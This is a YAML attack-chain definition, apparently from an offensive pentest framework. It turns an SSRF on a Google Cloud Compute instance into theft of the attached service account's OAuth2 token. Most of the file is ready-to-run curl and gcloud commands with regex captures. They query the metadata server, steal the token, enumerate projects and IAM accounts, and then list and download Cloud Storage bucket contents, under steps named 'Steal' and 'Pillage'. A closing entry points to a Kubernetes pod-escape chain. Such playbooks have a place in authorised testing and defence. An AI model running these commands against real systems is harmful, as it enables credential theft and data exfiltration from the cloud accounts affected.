id: gcp-imds-metadata
name: "Cloud — GCP IMDS → service-account token"
description: >
  SSRF on a GCP Compute instance reaches metadata.google.internal to
  steal the attached service account's OAuth2 token. Token's scopes
  determine reach (cloud-platform = full, devstorage = GCS only, etc.).
tags: [cloud, gcp, ssrf, imds, service-account]
difficulty: medium

inputs:
  - name: ssrf_url
    description: "Vulnerable URL that fetches arbitrary URLs."
    required: true

steps:
  - id: confirm_gcp
    name: "Confirm we're on GCP (metadata index)"
    inline_command: |
      curl '<url>http://metadata.google.internal/computeMetadata/v1/' \
        -H 'Metadata-Flavor: Google'
      # Alternative IPs: 169.254.169.254, metadata.google.internal, 100.100.100.200
    inputs:
      url: "${ssrf_url}"
    notes: |
      `Metadata-Flavor: Google` is REQUIRED. Same anti-SSRF mitigation as
      Azure — SSRFs without header injection are dead in the water.

  - id: enumerate_metadata
    name: "Enumerate identity + project + scopes"
    inline_command: |
      curl '<url>http://metadata.google.internal/computeMetadata/v1/project/project-id' -H 'Metadata-Flavor: Google'
      curl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/' -H 'Metadata-Flavor: Google'
      curl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes' -H 'Metadata-Flavor: Google'
    inputs:
      url: "${ssrf_url}"
    capture:
      - var: gcp_project
        regex: '^([a-z][a-z0-9-]+)$'
        match: first
      - var: gcp_sa_email
        regex: '([^/\s]+@[^/\s]+\.iam\.gserviceaccount\.com)'
        match: first

  - id: steal_token
    name: "Steal the OAuth2 access token"
    inline_command: |
      curl '<url>http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token' \
        -H 'Metadata-Flavor: Google'
    inputs:
      url: "${ssrf_url}"
    capture:
      - var: gcp_access_token
        regex: '"access_token"\s*:\s*"([^"]+)"'
        match: first

  - id: enumerate_gcloud
    name: "Use the token with gcloud / curl"
    inline_command: |
      export CLOUDSDK_AUTH_ACCESS_TOKEN='<token>'
      gcloud auth print-access-token
      gcloud projects list
      gcloud iam service-accounts list --project=<project>
      # Or raw API calls:
      curl 'https://compute.googleapis.com/compute/v1/projects/<project>/zones?fields=items.name' \
        -H 'Authorization: Bearer <token>'
    inputs:
      token: "${gcp_access_token}"
      project: "${gcp_project}"

  - id: bucket_pillage
    name: "Pillage GCS buckets (if scope allows)"
    inline_command: |
      # List all buckets in the project:
      curl 'https://storage.googleapis.com/storage/v1/b?project=<project>' \
        -H 'Authorization: Bearer <token>'
      # Read each bucket's contents:
      curl 'https://storage.googleapis.com/storage/v1/b/<bucket>/o' \
        -H 'Authorization: Bearer <token>'
      # Download an object:
      curl 'https://storage.googleapis.com/storage/v1/b/<bucket>/o/<object>?alt=media' \
        -H 'Authorization: Bearer <token>' -o file
    inputs:
      token: "${gcp_access_token}"
      project: "${gcp_project}"

references:
  - title: "GCP metadata server docs"
    url:   "https://cloud.google.com/compute/docs/metadata/overview"
  - title: "HackTricks — GCP SSRF"
    url:   "https://book.hacktricks.wiki/en/pentesting-web/ssrf-server-side-request-forgery/cloud-ssrf.html"

next_chains:
  - chain: kubernetes-pod-escape
    when:   'cluster GKE-hosted'
    reason: 'Many GCP boxes are GKE pods — same SSRF often reaches Kubernetes API.'
